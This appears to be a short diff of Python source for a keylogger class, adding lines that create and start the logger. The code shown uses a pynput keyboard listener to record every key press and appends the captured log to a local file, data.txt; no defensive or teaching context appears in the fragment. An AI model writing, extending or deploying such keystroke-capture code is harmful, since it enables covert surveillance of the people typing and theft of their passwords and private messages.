@@ -30,9 +30,13 @@ class Keylogger:
         with open("data.txt", "a") as data_file:
             data_file.write(self.log)
 
-
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
+
+
+my_keylogger = Keylogger()
+my_keylogger.start()
+
